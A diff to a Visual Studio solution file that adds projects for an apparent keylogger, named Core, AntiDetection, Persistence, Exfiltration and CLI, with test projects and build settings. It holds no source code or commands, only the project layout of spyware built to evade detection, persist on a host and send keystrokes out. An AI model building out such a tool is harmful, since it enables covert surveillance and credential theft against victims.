@@ -1,9 +1,25 @@
 ﻿
 Microsoft Visual Studio Solution File, Format Version 12.00
 # Visual Studio Version 17
-VisualStudioVersion = 17.13.35931.197 d17.13
+VisualStudioVersion = 17.13.35931.197
 MinimumVisualStudioVersion = 10.0.40219.1
 Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger", "Keylogger\Keylogger.csproj", "{8FBA9AD2-8BD4-4890-9BB3-755A4143C620}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.Core", "src\Keylogger.Core\Keylogger.Core.csproj", "{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.AntiDetection", "src\Keylogger.AntiDetection\Keylogger.AntiDetection.csproj", "{B1C2D3E4-F5A6-7890-2345-67890BCDEF12}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.CLI", "src\Keylogger.CLI\Keylogger.CLI.csproj", "{C1D2E3F4-A5B6-7890-3456-78901CDEF234}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.Persistence", "src\Keylogger.Persistence\Keylogger.Persistence.csproj", "{D1E2F3A4-B5C6-7890-4567-89012DEF3456}"
+EndProject
+Project("{00000000-0000-0000-0000-000000000000}") = "Keylogger.AntiDetection.Tests", "tests\Keylogger.AntiDetection.Tests\Keylogger.AntiDetection.Tests.csproj", "{EDD2C008-1B5C-445E-9D8B-EC109226AFD9}"
+EndProject
+Project("{00000000-0000-0000-0000-000000000000}") = "Keylogger.Core.Tests", "tests\Keylogger.Core.Tests\Keylogger.Core.Tests.csproj", "{ABA75893-041B-4F13-B8E8-0895E69F23DB}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.Persistence.Tests", "tests\Keylogger.Persistence.Tests\Keylogger.Persistence.Tests.csproj", "{4993E205-18FC-4148-82B8-4CE05E803F30}"
+EndProject
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger.Exfiltration", "src\Keylogger.Exfiltration\Keylogger.Exfiltration.csproj", "{736BA029-50AA-478A-9085-38C563D429D9}"
 EndProject
 Global
 	GlobalSection(SolutionConfigurationPlatforms) = preSolution
@@ -15,6 +31,30 @@ Global
 		{8FBA9AD2-8BD4-4890-9BB3-755A4143C620}.Debug|Any CPU.Build.0 = Debug|Any CPU
 		{8FBA9AD2-8BD4-4890-9BB3-755A4143C620}.Release|Any CPU.ActiveCfg = Release|Any CPU
 		{8FBA9AD2-8BD4-4890-9BB3-755A4143C620}.Release|Any CPU.Build.0 = Release|Any CPU
+		{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}.Release|Any CPU.Build.0 = Release|Any CPU
+		{B1C2D3E4-F5A6-7890-2345-67890BCDEF12}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{B1C2D3E4-F5A6-7890-2345-67890BCDEF12}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{B1C2D3E4-F5A6-7890-2345-67890BCDEF12}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{B1C2D3E4-F5A6-7890-2345-67890BCDEF12}.Release|Any CPU.Build.0 = Release|Any CPU
+		{C1D2E3F4-A5B6-7890-3456-78901CDEF234}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{C1D2E3F4-A5B6-7890-3456-78901CDEF234}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{C1D2E3F4-A5B6-7890-3456-78901CDEF234}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{C1D2E3F4-A5B6-7890-3456-78901CDEF234}.Release|Any CPU.Build.0 = Release|Any CPU
+		{D1E2F3A4-B5C6-7890-4567-89012DEF3456}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{D1E2F3A4-B5C6-7890-4567-89012DEF3456}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{D1E2F3A4-B5C6-7890-4567-89012DEF3456}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{D1E2F3A4-B5C6-7890-4567-89012DEF3456}.Release|Any CPU.Build.0 = Release|Any CPU
+		{4993E205-18FC-4148-82B8-4CE05E803F30}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{4993E205-18FC-4148-82B8-4CE05E803F30}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{4993E205-18FC-4148-82B8-4CE05E803F30}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{4993E205-18FC-4148-82B8-4CE05E803F30}.Release|Any CPU.Build.0 = Release|Any CPU
+		{736BA029-50AA-478A-9085-38C563D429D9}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{736BA029-50AA-478A-9085-38C563D429D9}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{736BA029-50AA-478A-9085-38C563D429D9}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{736BA029-50AA-478A-9085-38C563D429D9}.Release|Any CPU.Build.0 = Release|Any CPU
 	EndGlobalSection
 	GlobalSection(SolutionProperties) = preSolution
 		HideSolutionNode = FALSE
